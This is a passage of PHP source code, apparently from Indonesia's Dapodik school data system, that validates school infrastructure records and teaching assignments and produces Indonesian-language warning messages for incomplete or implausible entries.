                        $keterangan = "<b>NJOP</b> pada Tanah dengan nama <b>".$tanah->getNama()."</b> untuk Periode Tahun ".$tahunAjaranId." harap diisi";
                        $this->setArrValidation($i++, "prasarana", 2, $keterangan);
                    } else {
                        if ($tanahLongObj->getNjop() < 100) {
                            $keterangan = "<b>NJOP</b> pada Tanah dengan nama <b>".$tanah->getNama()."</b> untuk Periode Tahun ".$tahunAjaranId." harap diisi dengan nominal benar (Rp.".number_format($tanahLongObj->getNjop()).")";
                            $this->setArrValidation($i++, "prasarana", 2, $keterangan);
                        }
                    }
                } */

                // Bangunan
                $c = new \Criteria();
                $c->add(BangunanPeer::SEKOLAH_ID, $sekolah_id);
                $c->add(BangunanPeer::SOFT_DELETE, 0);
                $c->add(BangunanPeer::ID_HAPUS_BUKU, NULL, \Criteria::ISNULL);
                $bangunanObj = BangunanPeer::doSelect($c);
                
                foreach ($bangunanObj as $bangunan) {
                    $bangunanLongObj = BangunanLongitudinalPeer::retrieveByPk($bangunan->getIdBangunan(), $sessionSemester);
                    if (!is_object($bangunanLongObj)) {
                        $keterangan = "<b>Kondisi</b> Bangunan dengan nama <b>{$bangunan->getNama()}</b> utk Semester <b>{$tahunAjaranId} {$namaSemester}</b> belum diisi";
                        $this->setArrValidation($i++, "bangunan", 2, $keterangan);
                    }

                    if (is_object($bangunan->getTanah())) {
                        if (!empty($bangunan->getTanah()->getIdHapusBuku()) && empty($bangunan->getIdHapusBuku())) {
                            $keterangan = "Terdeteksi Bangunan dengan nama <b>{$bangunan->getNama()}</b> terdapat pada Tanah dengan nama <b>{$bangunan->getTanah()->getNama()}</b> yang sudah dihapus bukukan";
                            $this->setArrValidation($i++, "bangunan", 2, $keterangan);
                        }
                    }
                }

                // Ruang
                $c = new \Criteria();
                $c->addJoin(RuangPeer::ID_BANGUNAN, BangunanPeer::ID_BANGUNAN, \Criteria::INNER_JOIN);
                $c->addJoin(BangunanPeer::ID_TANAH, TanahPeer::ID_TANAH, \Criteria::INNER_JOIN);
                $c->add(RuangPeer::SEKOLAH_ID, $sekolah_id);
                $c->add(RuangPeer::SOFT_DELETE, 0);
                $c->add(BangunanPeer::ID_HAPUS_BUKU, NULL, \Criteria::ISNULL);
                $c->add(BangunanPeer::SOFT_DELETE, 0);
                $c->add(BangunanPeer::ID_HAPUS_BUKU, NULL, \Criteria::ISNULL);
                $c->add(BangunanPeer::SOFT_DELETE, 0);
                $prasaranas = RuangPeer::doSelect($c);
                $count = sizeof($prasaranas);

                if ($count < 1) {
                    $keterangan = "Data Ruang Kosong";
                    $this->setArrValidation($i++, "prasarana", 2, $keterangan);
                } else {

                    $jmlRuangKelas = 0;
                    $jmlRuangGuru = 0;
                    $jmlBengkelSmk = 0;
                    $jmlToilet = 0;
                    $kondisiRusakBerat = 0;
                    $kondisiRusakTotal = 0;
                    $kondisiRusakBeratDanTotal = 0;
                    $namaRuangDobelArr = 0;
                    foreach ($prasaranas as $prasarana) {

                        /*if ($prasarana->getLastUpdate() > $prasarana->getLastSync()) {
                            $bitter = new SyncPrimerTableInfo();
                            $bitter->setMampatString($prasarana);
                            $checksum = $bitter->sirup();

                            $c = new \Criteria();
                            $c->add(BitterTablePeer::PARAM_1, $sekolah_id);
                            $c->add(BitterTablePeer::PARAM_2, 4);
                            $c->add(BitterTablePeer::PARAM_3, $prasarana->getPrimaryKey());
                            $bitterObj = BitterTablePeer::doSelectOne($c);

                            if (is_object($bitterObj)) {
                                if ($bitterObj->getParam4() != $checksum) {
                                    // echo $bitterObj->getParam4(). "  ==  ". $checksum."<br>";
                                    // echo $prasarana->getPrimaryKey(); die();
                                    $keterangan = "Sistem mendeteksi data prasarana <b>".$prasarana->getNmRuang()."</b> diubah menggunakan aplikasi selain aplikasi dapodik";
                                    $this->setArrValidation($i++, "prasarana", 2, $keterangan);
                                    // $this->setYouDead();
                                    break;
                                }
                            } else {
                                $keterangan = "Terdeteksi terjadi perubahan data prasarana <b>".$siswa->getNama()."</b> namun tidak terdaftar pada sistem";
                                $this->setArrValidation($i++, "prasarana", 2, $keterangan);
                                // $this->setYouDead();
                                break;
                            }
                        }*/
                        $namaRuangDobelArr[$prasarana->getNmRuang()] += 1;

                        if ($prasarana->getPanjang() < 1) {
                            $keterangan = "<b>Panjang</b> Ruang dengan nama <b>{$prasarana->getNmRuang()}</b> harap diisi dengan benar";
                            $this->setArrValidation($i++, "prasarana", 2, $keterangan);
                        }

                        if ($prasarana->getLebar() < 1) {
                            $keterangan = "<b>Lebar</b> Ruang dengan nama <b>{$prasarana->getNmRuang()}</b> harap diisi dengan benar";
                            $this->setArrValidation($i++, "prasarana", 2, $keterangan);
                        }

                        if (in_array($prasarana->getJenisPrasaranaId(), array(26,27,28,29))) {
                            $jmlToilet++;
                        }

                        // Prasarana Longitudinal
                        $c = new \Criteria();
                        $c->add(RuangLongitudinalPeer::ID_RUANG, $prasarana->getIdRuang());
                        $c->add(RuangLongitudinalPeer::SEMESTER_ID, $sessionSemester);
                        $c->add(RuangLongitudinalPeer::SOFT_DELETE, 0);
                        $prasaranaLong = RuangLongitudinalPeer::doCount($c);

                        if ($prasaranaLong < 1) {
                            $keterangan = "<b>Kondisi</b> Ruang dengan nama {$prasarana->getJenisPrasarana()->getNama()} - <b>{$prasarana->getNmRuang()}</b> yang terletak pada Bangunan dengan nama ".$prasarana->getBangunan()->getNama()." utk Semester <b>{$tahunAjaranId} {$namaSemester}</b> belum diisi";
                            $this->setArrValidation($i++, "ruang_longitudinal", 2, $keterangan);
                        }

                        // Jika prasarana ruang kelas
                        if (in_array($prasarana->getJenisPrasaranaId(), array(1))) {
                            $jmlRuangKelas++;

                            $request->query->set('id_ruang', $prasarana->getIdRuang());
                            $request->query->set('limit', 'unlimited');
                            $tingkatKerusakanTotalJson = Sarpras::getTingkatKerusakanTotal($request, $app);
                            $tingkatKerusakanTotal = json_decode($tingkatKerusakanTotalJson);

                            if ($tingkatKerusakanTotal[0]->persentase_total > 45
                                && $tingkatKerusakanTotal[0]->persentase_total <= 65){
                                $kondisiRusakBerat++;
                                $kondisiRusakBeratDanTotal++;
                            } else if ($tingkatKerusakanTotal[0]->persentase_total > 65) {
                                $kondisiRusakTotal++;
                                $kondisiRusakBeratDanTotal++;

                                $keterangan = "Prasarana jenis ruang kelas/teori dengan nama <b>{$prasarana->getNmRuang()}</b> terdeteksi tergolong rusak berat. Mohon periksa kembali isian input kondisi prasarana tersebut. Abaikan peringatan ini jika benar";
                                $this->setArrValidation($i++, "prasarana", 1, $keterangan);

                                $c = new \Criteria();
                                $c->add(RombonganBelajarPeer::SOFT_DELETE, 0);
                                $c->add(RombonganBelajarPeer::SEMESTER_ID, $sessionSemester);
                                $c->add(RombonganBelajarPeer::SEKOLAH_ID, $sekolahObj->getSekolahId());
                                $rombelRusakTotalObj = RombonganBelajarPeer::doSelect($c);
                                $rombelRusakTotalCount = RombonganBelajarPeer::doCount($c);

                                $rombelRusakTotalArr = array();
                                foreach ($rombelRusakTotalObj as $rombelRusakTotal) {
                                    $rombelRusakTotalArr[] = $rombelRusakTotal->getNama();
                                }
                                $rombelRusakTotalText = implode($rombelRusakTotalArr, ", ");

                                if ($rombelRusakTotalCount > 1) {
                                    $keterangan = "Prasarana jenis ruang kelas/teori dengan nama <b>{$prasarana->getNmRuang()}</b> terdeteksi rusak berat namun digunakan sebagai ruang pembelajaran pada rombel <b>{$rombelRusakTotalText}</b>.";
                                    $this->setArrValidation($i++, "prasarana", 2, $keterangan);
                                }
                            }

                            $c = new \Criteria();
                            $c->add(AlatPeer::SOFT_DELETE, 0);
                            $c->add(AlatPeer::ID_HAPUS_BUKU, NULL, \Criteria::ISNULL);
                            $saranas = $prasarana->getAlats($c);
                            // $saranaJenisSarana = $prasarana->getSaranasJoinJenisSarana($c);

                            if (sizeof($saranas) < 1) {
                                $keterangan = "<b>Sarana</b> yg berada di dalam Prasarana dengan nama <b>{$prasarana->getNmRuang()}</b> utk Periode <b>{$namaSemester} / {$tahunAjaranId}</b> belum diisi.";
                                $this->setArrValidation($i++, "sarana", 1, $keterangan);
                            } else {

                                if (!in_array($sekolahObj->getBentukPendidikanId(), array(7,8,13,29))) {
                                    if ($prasarana->getPanjang() < 4) {
                                        $keterangan = "Terdeteksi panjang ruang kelas dengan nama <b>{$prasarana->getNmRuang()}</b> tidak wajar karena dibawah 4m. Harap diisi dengan benar (Saat ini panjang {$prasarana->getPanjang()}m)";
                                        $this->setArrValidation($i++, "prasarana", 2, $keterangan);
                                    } else if ($prasarana->getPanjang() > 20) {
                                        $keterangan = "Terdeteksi panjang ruang kelas dengan nama <b>{$prasarana->getNmRuang()}</b> tidak wajar karena lebih 20m. Harap diisi dengan benar (Saat ini panjang {$prasarana->getPanjang()}m)";
                                        $this->setArrValidation($i++, "prasarana", 2, $keterangan);
                                    }

                                    if ($prasarana->getLebar() < 4) {
                                        $keterangan = "Terdeteksi lebar ruang kelas dengan nama <b>{$prasarana->getNmRuang()}</b> tidak wajar karena dibawah 4m. Harap diisi dengan benar (Saat ini lebar {$prasarana->getLebar()}m)";
                                        $this->setArrValidation($i++, "prasarana", 2, $keterangan);
                                    } else if ($prasarana->getLebar() > 20) {
                                        $keterangan = "Terdeteksi lebar ruang kelas dengan nama <b>{$prasarana->getNmRuang()}</b> tidak wajar karena lebih 20m. Harap diisi dengan benar (Saat ini lebar {$prasarana->getLebar()}m)";
                                        $this->setArrValidation($i++, "prasarana", 2, $keterangan);
                                    }
                                }

                                // 1   Meja Siswa
                                // 2   Kursi Siswa
                                // 3   Meja Guru
                                // 4   Kursi Guru
                                $jmlMejaSiswaInRuangKelas = 0;
                                $jmlKursiSiswaInRuangKelas = 0;
                                $jmlMejaGuruInRuangKelas = 0;
                                $jmlKursiGuruInRuangKelas = 0;

                                foreach ($saranas as $sarana) {

                                    if ($sarana->getJenisSaranaId() == 1) {
                                        $jmlMejaSiswaInRuangKelas++;
                                    } else if ($sarana->getJenisSaranaId() == 2) {
                                        $jmlKursiSiswaInRuangKelas++;
                                    } else if ($sarana->getJenisSaranaId() == 3) {
                                        $jmlMejaGuruInRuangKelas++;
                                    } else if ($sarana->getJenisSaranaId() == 4) {
                                        $jmlKursiGuruInRuangKelas++;
                                    }

                                    $c = new \Criteria();
                                    $c->add(AlatLongitudinalPeer::ID_ALAT, $sarana->getIdAlat());
                                    $c->add(AlatLongitudinalPeer::SEMESTER_ID, $sessionSemester);
                                    $c->add(AlatLongitudinalPeer::SOFT_DELETE, 0);
                                    $countSarLongs = AlatLongitudinalPeer::doCount($c);
                                    $saranaLongs = AlatLongitudinalPeer::doSelectOne($c);

                                    $jenisSarana = $sarana->getJenisSarana();
                                    $namaJenisSarana = is_object($jenisSarana) ? $jenisSarana->getNama() : "Unknow";
                                    if ($countSarLongs < 1) {

                                        $keterangan = "<b>Data Periodik</b> Alat dengan Jenis Sarana <b>{$namaJenisSarana}</b> yg berada di dalam Ruang dengan nama <b>{$prasarana->getNmRuang()}</b> utk Periode <b>{$namaSemester} / {$tahunAjaranId}</b> belum diisi.";
                                        $this->setArrValidation($i++, "sarana_longitudinal", 2, $keterangan);
                                    } else {
                                        if ($saranaLongs->getJumlah() < 1) {
                                            $keterangan = "<b>Data Periodik</b> Alat dengan Jenis Sarana <b>{$namaJenisSarana}</b> yg berada di dalam Ruang dengan nama <b>{$prasarana->getNmRuang()}</b> utk Periode <b>{$namaSemester} / {$tahunAjaranId}</b> jumlah harap diisi dengan benar.";
                                            $this->setArrValidation($i++, "sarana_longitudinal", 2, $keterangan);
                                        }
                                    }
                                }
                            }

                            if ($jmlMejaSiswaInRuangKelas < 1) {
                                $keterangan = "Terdeteksi data tidak wajar, ruang kelas dengan nama <b>".$prasarana->getNmRuang()."</b> tidak memiliki Meja Siswa";
                                $this->setArrValidation($i++, "prasarana", 2, $keterangan);
                            }
                            if ($jmlKursiSiswaInRuangKelas < 1) {
                                $keterangan = "Terdeteksi data tidak wajar, ruang kelas dengan nama <b>".$prasarana->getNmRuang()."</b> tidak memiliki Kursi Siswa";
                                $this->setArrValidation($i++, "prasarana", 2, $keterangan);
                            }
                            if ($jmlMejaGuruInRuangKelas < 1) {
                                $keterangan = "Terdeteksi data tidak wajar, ruang kelas dengan nama <b>".$prasarana->getNmRuang()."</b> tidak memiliki Meja Guru";
                                $this->setArrValidation($i++, "prasarana", 2, $keterangan);
                            }
                            if ($jmlKursiGuruInRuangKelas < 1) {
                                $keterangan = "Terdeteksi data tidak wajar, ruang kelas dengan nama <b>".$prasarana->getNmRuang()."</b> tidak memiliki Kursi Guru";
                                $this->setArrValidation($i++, "prasarana", 2, $keterangan);
                            }

                        } else if (in_array($prasarana->getJenisPrasaranaId(), array(15,16))) {
                            $jmlBengkelSmk++;
                        } else if ($prasarana->getJenisPrasaranaId() == 23) {
                            $jmlRuangGuru++;
                        }
                    }

                    foreach ($namaRuangDobelArr as $key => $value) {
                        if ($value > 1) {
                            $keterangan = "Terdeteksi nama ruang ganda dengan nama <b>".$key."</b>";
                            $this->setArrValidation($i++, "ruang", 2, $keterangan);
                        }
                    }
                    // echo $kondisiRusakBeratDanTotal; die;
                    // $kondisiRusakBeratDanTotal = 40;
                    // echo $kondisiRusakBeratDanTotal/$jmlRuangKelas;
                    $kondisiKerusakanRuangKelas = $kondisiRusakBeratDanTotal/$jmlRuangKelas;
                    // echo ;
                    if (number_format($kondisiKerusakanRuangKelas, 2) > 0.5) {
                        // echo "masuk sini ga sih?";
                        $keterangan = "Ruang dengan jenis Ruang Kelas/Teori di sekolah memiliki tingkat kerusakan (rusak total+rusak berat) lebih dari setengah jumlah ruangan yg ada. Pastikan tidak ada manipulasi/rekayasa data (Saat ini Rusak Total: {$kondisiRusakTotal}, Rusak Berat: {$kondisiRusakBerat})";
                        $this->setArrValidation($i++, "prasarana", 1, $keterangan);
                    }

                    if ($jmlRuangKelas < 1) {
                        $keterangan = "Sekolah tidak memiliki Ruang Teori/Kelas, periksa baik-baik isian prasarana";
                        $this->setArrValidation($i++, "prasarana", 2, $keterangan);
                    }

                    if ($jmlRuangGuru < 1) {
                        $keterangan = "Sekolah tidak memiliki Ruang Guru, periksa baik-baik isian prasarana";
                        $this->setArrValidation($i++, "prasarana", 1, $keterangan);
                    }

                    if (in_array($sekolahObj->getBentukPendidikanId(), array(13,15))) {
                        if ($jmlToilet < 1) {
                            $keterangan = "Sekolah tidak memiliki Kamar Mandi/WC/Toilet, pastikan kebenaran data yang dikirimkan";
                            $this->setArrValidation($i++, "prasarana", 2, $keterangan);
                        }
                    } else {
                        if ($jmlToilet < 1) {
                            $keterangan = "Sekolah tidak memiliki Kamar Mandi/WC/Toilet, pastikan kebenaran data yang dikirimkan";
                            $this->setArrValidation($i++, "prasarana", 1, $keterangan);
                        }
                    }

                    if ($sekolahObj->getBentukPendidikanId() == 15 && $jmlBengkelSmk < 1) {
                        $keterangan = "Sekolah jenjang SMK tidak mempunyai Bengkel/Ruang Praktik Kerja, periksa baik-baik isian prasarana";
                        $this->setArrValidation($i++, "prasarana", 1, $keterangan);
                    }

                    if (in_array($sekolahObj->getBentukPendidikanId(), array(13,15))) {
                        if ($countPerpus < 1) {
                            $keterangan = "Sekolah jenjang SMA/SMK tidak mempunyai Perpustakaan, periksa baik-baik isian prasarana";
                            $this->setArrValidation($i++, "prasarana", 1, $keterangan);
                        }

                        if ($countPrasaranaLab < 1) {
                            $keterangan = "Sekolah jenjang SMA/SMK tidak mempunyai Laboratorium, periksa baik-baik isian prasarana";
                            $this->setArrValidation($i++, "prasarana", 1, $keterangan);
                        }
                    }
                }

                foreach ($prasaranaLabObj as $prasaranaLab) {
                    if (in_array($prasaranaLab->getJenisPrasaranaId(), array(8,9))) {
                        $c = new \Criteria();
                        $c->add(AlatPeer::ID_RUANG, $prasaranaLab->getIdRuang());
                        $c->addJoin(AlatPeer::JENIS_SARANA_ID, JenisSaranaPeer::JENIS_SARANA_ID, \Criteria::INNER_JOIN);
                        $c->add(AlatPeer::ID_HAPUS_BUKU, NULL, \Criteria::ISNULL);
                        $c->add(AlatPeer::SOFT_DELETE, 0);
                        $c->add(JenisSaranaPeer::NAMA, "%Komputer%", \Criteria::ILIKE);
                        $c->add(JenisSaranaPeer::EXPIRED_DATE, NULL, \Criteria::ISNULL);
                        $countKomputerInLab = AlatPeer::doCount($c);

                        if ($countKomputerInLab < 1) {
                            $keterangan = "Terdeteksi data tidak wajar. Sekolah memiliki laboratorium namun tidak memiliki sarana yang berkaitan dengan komputer. Periksa kembali isian prasarana dan sumber listrik";
                            $this->setArrValidation($i++, "prasarana", 2, $keterangan);
                        }
                    }
                }

            } else if ($jenis_validasi == "pembelajaran"){

                // validasi ptk yang telah dihapus tapi masih mendapat jam di pembelajaran
                $c = new \Criteria();
                $c->addJoin(PembelajaranPeer::ROMBONGAN_BELAJAR_ID, RombonganBelajarPeer::ROMBONGAN_BELAJAR_ID);
                $c->add(RombonganBelajarPeer::SOFT_DELETE, 0);
                $c->add(RombonganBelajarPeer::SEKOLAH_ID, $sekolah_id);
                $c->add(RombonganBelajarPeer::SEMESTER_ID, $sessionSemester);
                $c->add(PembelajaranPeer::SOFT_DELETE,0);
                $c->add(PembelajaranPeer::SEMESTER_ID, $sessionSemester);

                // print_r($c->toString()); die;
                $pembelajaranAll = PembelajaranPeer::doSelect($c);
                // print_r($pembelajaranAll); die;

                foreach ($pembelajaranAll as $pall) {

                    $d = new \Criteria();
                    $d->addJoin(PtkTerdaftarPeer::PTK_ID, PtkPeer::PTK_ID, \Criteria::JOIN);
                    $d->add(PtkTerdaftarPeer::PTK_TERDAFTAR_ID, $pall->getPtkTerdaftarId());
                    $d->add(PtkTerdaftarPeer::TAHUN_AJARAN_ID, $tahunAjaranId);
                    $d->add(PtkTerdaftarPeer::SOFT_DELETE, 0);

                    // print_r($d->toString()); die;
                    $pengajar = PtkTerdaftarPeer::doSelectOne($d);
                    if (!is_object($pengajar)) {
                        continue;
                    }

                    if ($sekolahObj->getFlag() != 300) {
                        if ($pall->getMataPelajaranId() == "700106100") {
                            $keterangan = "Pembelajaran dgn nama rombel <b>".$pall->getRombonganBelajar()->getNama()."</b> dan Tingkat Pendidikan <b>".$pall->getRombonganBelajar()->getTingkatPendidikanId()."</b> terdeteksi menjalankan mata pelajaran Informatika, sedangkan sekolah anda belum diizinkan menyelenggarakan mata pelajaran Informatika";
                            $this->setArrValidation($i++, "pembelajaran", 2, $keterangan);  
                        }
                    }

                    if (strlen($pall->getNamaMataPelajaran()) > 50) {
                        $keterangan = "Nama Bidang Studi Lokal Mapel <b>{$pall->getNamaMataPelajaran()}</b> rombel <b>{$pall->getRombonganBelajar()->getNama()}</b> yang diajar oleh <b>{$pengajar->getPtk()->getNama()}</b> memiliki lebih dari 50 karakter";
                        $this->setArrValidation($i++, "pembelajaran", 2, $keterangan);
                    }

                    if($pengajar->getJenisKeluarId() != null){
                        $keterangan = "Mapel <b>{$pall->getNamaMataPelajaran()}</b> rombel <b>{$pall->getRombonganBelajar()->getNama()}</b> diajar oleh <b>{$pengajar->getPtk()->getNama()}</b> yang telah non-aktif";
                        $this->setArrValidation($i++, "pembelajaran", 2, $keterangan);
                    }

                    if($pengajar->getPtk()->getSoftDelete() == 1){
                        $keterangan = "Mapel <b>{$pall->getNamaMataPelajaran()}</b> rombel <b>{$pall->getRombonganBelajar()->getNama()}</b> diajar oleh <b>{$pengajar->getPtk()->getNama()}</b> yang telah dihapus dari daftar PTK";
                        $this->setArrValidation($i++, "pembelajaran", 2, $keterangan);
                    }

                    if ($pall->getRombonganBelajar()->getJenisRombel() == 2) {
                        $arrJumPembPerRombel[$pall->getRombonganBelajarId()]['jumlah_pembelajaran'] += 1;
                        $arrJumPembPerRombel[$pall->getRombonganBelajarId()]['nama_rombel'] = $pall->getRombonganBelajar()->getNama();
                        $arrJumPembPerRombel[$pall->getRombonganBelajarId()]['tingkat'] = $pall->getRombonganBelajar()->getTingkatPendidikanId();
                    }

                    if ($pall->getStatusDiKurikulum() == 1 && $pall->getMataPelajaranId() == '400200000' && $pall->getJamMengajarPerMinggu() < 24) {
                        $keterangan = "Mapel <b>{$pall->getNamaMataPelajaran()}</b> rombel <b>{$pall->getRombonganBelajar()->getNama()}</b> diajar oleh <b>{$pengajar->getPtk()->getNama()}</b> minimal harus 24 jam";
                        $this->setArrValidation($i++, "pembelajaran", 2, $keterangan);
                    }

                }

                if ($app['session']->get('jenjang') == 'DIKMEN'){

                    foreach ($arrJumPembPerRombel as $key => $value) {
                        if ($value['jumlah_pembelajaran'] > 1) {
                            $keterangan = "Rombel dengan nama <b>".$value['nama_rombel']."</b> dengan jenis rombel <b>Kelas Teori</b> diajarkan oleh lebih dari satu guru";
                            $this->setArrValidation($i++, "pembelajaran", 2, $keterangan);
                        }
                    }

                    $sql = "select
                                ptk.ptk_id,
                                ptk.nama,
                                rombongan_belajar.tingkat_pendidikan_id,
                                rombongan_belajar.nama nama_rombel,
                                pembelajaran.status_di_kurikulum kelompok1,
                                pembelajaran.nama_mata_pelajaran matpel1,
                                peminatan.status_di_kurikulum kelompok5,
                                peminatan.nama_mata_pelajaran matpel5
                            from pembelajaran
                            join rombongan_belajar on pembelajaran.rombongan_belajar_id = rombongan_belajar.rombongan_belajar_id
                            join ptk_terdaftar on pembelajaran.ptk_terdaftar_id = ptk_terdaftar.ptk_terdaftar_id
                            join ptk on ptk_terdaftar.ptk_id = ptk.ptk_id
                            join (
                                select
                                    *
                                from pembelajaran
                                where
                                    pembelajaran.soft_delete = 0
                                    and pembelajaran.status_di_kurikulum = 5
                            ) peminatan on pembelajaran.rombongan_belajar_id = peminatan.rombongan_belajar_id
                                and peminatan.mata_pelajaran_id = pembelajaran.mata_pelajaran_id
                                and peminatan.semester_id = pembelajaran.semester_id
                                and ptk_terdaftar.ptk_terdaftar_id = peminatan.ptk_terdaftar_id
                            where
                                pembelajaran.soft_delete = 0
                                and pembelajaran.status_di_kurikulum = 1
                                and rombongan_belajar.soft_delete = 0
                                and rombongan_belajar.semester_id = '{$sessionSemester}'
                                and rombongan_belajar.sekolah_id = '{$sekolah_id}'
                                and ptk_terdaftar.tahun_ajaran_id = '{$tahunAjaranId}'
                                and ptk_terdaftar.jenis_keluar_id is null
                                and ptk_terdaftar.soft_delete = 0
                                and ptk.soft_delete = 0";

                    $invalid1 = getDataBySql($sql, FALSE, DBNAME);

                    if (sizeof($invalid1) > 0) {

                        foreach ($invalid1 as $value) {
                            $keterangan = "Rombel dengan nama <b>".$value['nama_rombel']."</b> untuk kelompok mata pelajaran <b>(1 - Matpel Bidang Studi Wajib)</b> dan <b>(5 - Matpel Peminatan)</b> diajarkan oleh guru yang sama yaitu GTK a/n <b>".$value['nama']."</b> dengan nama mata pelajaran <b>".$value['matpel1']."</b>";
                            $this->setArrValidation($i++, "pembelajaran", 1, $keterangan);
                        }

                    }

                    $sql = "select
                                ptk.ptk_id,
                                ptk.nama,
                                tambahan_wajib.nama tambahan_wajib_nama,
                                rombongan_belajar.tingkat_pendidikan_id,
                                rombongan_belajar.nama nama_rombel,
                                pembelajaran.status_di_kurikulum kelompok1,
                                pembelajaran.nama_mata_pelajaran matpel1,
                                tambahan_wajib.status_di_kurikulum kelompok5,
                                tambahan_wajib.nama_mata_pelajaran matpel5
                            from pembelajaran
                            join rombongan_belajar on pembelajaran.rombongan_belajar_id = rombongan_belajar.rombongan_belajar_id
                            join ptk_terdaftar on pembelajaran.ptk_terdaftar_id = ptk_terdaftar.ptk_terdaftar_id
                            join ptk on ptk_terdaftar.ptk_id = ptk.ptk_id
                            join (
                                select
                                    pembelajaran.*,
                                    ptk.*
                                from pembelajaran
                                join ptk_terdaftar on pembelajaran.ptk_terdaftar_id = ptk_terdaftar.ptk_terdaftar_id
                                join ptk on ptk_terdaftar.ptk_id = ptk.ptk_id
                                where
                                    pembelajaran.soft_delete = 0
                                    and pembelajaran.status_di_kurikulum = 2
                            ) tambahan_wajib on pembelajaran.rombongan_belajar_id = tambahan_wajib.rombongan_belajar_id
                                and tambahan_wajib.mata_pelajaran_id = pembelajaran.mata_pelajaran_id
                                and tambahan_wajib.semester_id = pembelajaran.semester_id
                                and pembelajaran.ptk_terdaftar_id <> tambahan_wajib.ptk_terdaftar_id
                            where
                                pembelajaran.soft_delete = 0
                                and pembelajaran.status_di_kurikulum in (1,5)
                                and rombongan_belajar.soft_delete = 0
                                and rombongan_belajar.semester_id = '{$sessionSemester}'
                                and rombongan_belajar.sekolah_id = '{$sekolah_id}'
                                and ptk_terdaftar.tahun_ajaran_id = '{$tahunAjaranId}'
                                and ptk_terdaftar.jenis_keluar_id is null
                                and ptk_terdaftar.soft_delete = 0
                                and ptk.soft_delete = 0";

                    $invalid1 = getDataBySql($sql, FALSE, DBNAME);

                    if (sizeof($invalid1) > 0) {

                        $bentukPendidikan = $sekolahObj->getBentukPendidikanId();
                        if ($bentukPendidikan == 13) {
                            $kelompok2 = "2 - Matpel Bidang Studi Wajib (tambahan jam)";
                        } else {
                            $kelompok2 = "2 - Matpel Wajib (tambahan jam)";
                        }

                        foreach ($invalid1 as $value) {
                            $keterangan = "Rombel dengan nama <b>".$value['nama_rombel']."</b> untuk kelompok mata pelajaran <b>(1 - Matpel Bidang Studi Wajib atau 5 - Matpel Peminatan)</b> dan <b>({$kelompok2})</b> diajarkan oleh guru yang berbeda yaitu GTK a/n <b>".$value['nama'].", ".$value['tambahan_wajib_nama']."</b> dengan nama mata pelajaran <b>".$value['matpel1']."</b>";
                            $this->setArrValidation($i++, "pembelajaran", 1, $keterangan);
                        }

                    }

                }

                $sql = "select
                                ptk.ptk_id,
                                ptk.nama,
                                rombongan_belajar.tingkat_pendidikan_id,
                                rombongan_belajar.nama nama_rombel,
                                pembelajaran.status_di_kurikulum kelompok1,
                                pembelajaran.nama_mata_pelajaran matpel1,
                                peminatan.status_di_kurikulum kelompok5,
                                peminatan.nama_mata_pelajaran matpel5
                            from pembelajaran
                            join rombongan_belajar on pembelajaran.rombongan_belajar_id = rombongan_belajar.rombongan_belajar_id
                            join ptk_terdaftar on pembelajaran.ptk_terdaftar_id = ptk_terdaftar.ptk_terdaftar_id
                            join ptk on ptk_terdaftar.ptk_id = ptk.ptk_id
                            join (
                                select
                                    *
                                from pembelajaran
                                where
                                    pembelajaran.soft_delete = 0
                                    and pembelajaran.status_di_kurikulum = 5
                            ) peminatan on pembelajaran.rombongan_belajar_id = peminatan.rombongan_belajar_id
                                and peminatan.mata_pelajaran_id = pembelajaran.mata_pelajaran_id
                                and peminatan.semester_id = pembelajaran.semester_id
                                and peminatan.ptk_terdaftar_id = ptk_terdaftar.ptk_terdaftar_id
                            where
                                pembelajaran.soft_delete = 0
                                and pembelajaran.status_di_kurikulum = 8
                                and rombongan_belajar.soft_delete = 0
                                and rombongan_belajar.semester_id = '{$sessionSemester}'
                                and rombongan_belajar.sekolah_id = '{$sekolah_id}'
                                and ptk_terdaftar.tahun_ajaran_id = '{$tahunAjaranId}'
                                and ptk_terdaftar.jenis_keluar_id is null
                                and ptk_terdaftar.soft_delete = 0
                                and ptk.soft_delete = 0";

                    $invalid3 = getDataBySql($sql, FALSE, DBNAME);

                    if (sizeof($invalid3) > 0) {

                        foreach ($invalid3 as $value) {
                            $keterangan = "Rombel dengan nama <b>".$value['nama_rombel']."</b> untuk kelompok mata pelajaran <b>(8 - Pendampingan/Produktif)</b> dan <b>(5 - Matpel Peminatan)</b> diajarkan oleh guru yang sama yaitu GTK a/n <b>".$value['nama']."</b> dengan nama mata pelajaran <b>".$value['matpel1']."</b>";
                            $this->setArrValidation($i++, "pembelajaran", 1, $keterangan);
                        }

                    }

                $sql = "select
                            rombongan_belajar.rombongan_belajar_id,
                            rombongan_belajar.tingkat_pendidikan_id,
                            rombongan_belajar.nama as nama_rombel,
                            rombongan_belajar.jenis_rombel,
                            pembelajaran.mata_pelajaran_id,
                            pembelajaran.status_di_kurikulum,
                            mata_pelajaran.nama as nama_mapel,
                            count(1) jum_dobel
                        from pembelajaran
                        join rombongan_belajar on pembelajaran.rombongan_belajar_id = rombongan_belajar.rombongan_belajar_id
                        join ref.mata_pelajaran on pembelajaran.mata_pelajaran_id = mata_pelajaran.mata_pelajaran_id
                        where
                            pembelajaran.soft_delete = 0
                            and pembelajaran.status_di_kurikulum in (3,5)
                            and rombongan_belajar.soft_delete = 0
                            and rombongan_belajar.semester_id = '{$sessionSemester}'
                            and rombongan_belajar.sekolah_id = '{$sekolah_id}'
                        group by
                            rombongan_belajar.rombongan_belajar_id,
                            rombongan_belajar.tingkat_pendidikan_id,
                            rombongan_belajar.nama,
                            rombongan_belajar.jenis_rombel,
                            pembelajaran.mata_pelajaran_id,
                            pembelajaran.status_di_kurikulum,
                            mata_pelajaran.nama
                        having count(1) > 1";

                $guruMengajarDobel = getDataBySql($sql, FALSE, DBNAME);

                if (sizeof($guruMengajarDobel) > 0) {
                    foreach ($guruMengajarDobel as $value) {
                        if ($value["status_di_kurikulum"] == 5) {
                            if ($value["jenis_rombel"] == 1) {
                                $tipe = "Peminatan";
                            } else {
                                $tipe = "Lintas Minat";
                            }

                            $keterangan = "Rombel dengan nama <b>".$value['nama_rombel']."</b> tingkat ".$value['tingkat_pendidikan_id']." memiliki Mata Pelajaran yang berganda (<b>".$value['nama_mapel']."</b>) pada kelompok mata pelajaran <b>{$tipe}</b>";
                            $this->setArrValidation($i++, "pembelajaran", 2, $keterangan);
                        } else if ($value["status_di_kurikulum"] == 3) {
                            // wajib A
